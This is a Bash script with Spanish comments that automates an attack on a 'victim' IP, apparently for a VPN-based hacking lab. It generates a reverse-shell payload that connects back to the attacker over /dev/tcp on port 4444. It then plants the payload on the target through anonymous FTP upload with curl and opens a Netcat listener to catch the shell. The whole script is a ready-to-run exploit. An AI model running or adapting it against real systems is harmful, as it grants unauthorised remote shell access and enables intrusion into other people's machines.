#!/bin/bash

# Colores (Nivel Pro: Usando tput para compatibilidad de terminal)
verde=$(tput setaf 2)
rojo=$(tput setaf 1)
amarillo=$(tput setaf 3)
reset=$(tput sgr0)

# Función para mensajes de estado
log_status() { echo "${verde}[+]${reset} $1"; }
log_error() { echo "${rojo}[!]${reset} $1"; }
log_info() { echo "${amarillo}[*]${reset} $1"; }

# 1. Captura de IP de la víctima con validación básica
read -p "${amarillo}[?] Introduce la IP de la máquina víctima: ${reset}" ip_victima

if [[ ! $ip_victima =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    log_error "Formato de IP inválido. Saliendo..."
    exit 1
fi

# 2. Detección automática de la IP local (Interfaz tun0 o eth0)
# Intentamos obtener la IP de la VPN (tun0) primero, si no, eth0
ip_local=$(ip addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
           ip addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -n "$ip_local" ]; then
    log_status "Tu IP detectada: $ip_local"
    log_status "IP de la víctima: $ip_victima"
else
    log_error "No se pudo detectar tu dirección IP (¿está activa la interfaz?)."
    exit 1
fi

# 3. Creación dinámica del payload/script malicioso
log_info "Generando script de explotación 'cleon.sh'..."

cat <<EOF > cleon.sh
#!/bin/bash
# Payload generado automáticamente
bash -i >& /dev/tcp/$ip_local/4444 0>&1
EOF

chmod +x cleon.sh
log_status "Script 'cleon.sh' creado y listo para ejecución."

sleep 1
log_info "Iniciando escucha o siguiente fase..."








# --- Configuración del servidor FTP ---
servidor="$ip_victima"
usuario="anonymous"
archivo_local="cleon.sh"
# Es buena práctica asegurar que la ruta remota sea clara
archivo_remoto="scripts/cleon.sh"

echo -e "${amarillo}[*] Intentando subir $archivo_local a ftp://$servidor/$archivo_remoto...${reset}"

# Nivel Pro: 
# -s (silent): No muestra la barra de progreso de curl.
# -S (show-error): Si falla, sí muestra por qué.
# --ftp-create-dirs: Crea la carpeta 'scripts' si no existe en el servidor.
if curl -s -S --ftp-create-dirs -T "$archivo_local" "ftp://$servidor/$archivo_remoto" --user "$usuario:"; then
    echo -e "${verde}[+] El archivo se ha subido correctamente.${reset}"
else
    echo -e "${rojo}[!] Error crítico en la subida FTP.${reset}"
    exit 1
fi

echo -e "${amarillo}[*] Iniciando escucha con Netcat en el puerto 4444...${reset}"
# Abrir el listener automáticamente para recibir la shell
nc -lvnp 4444



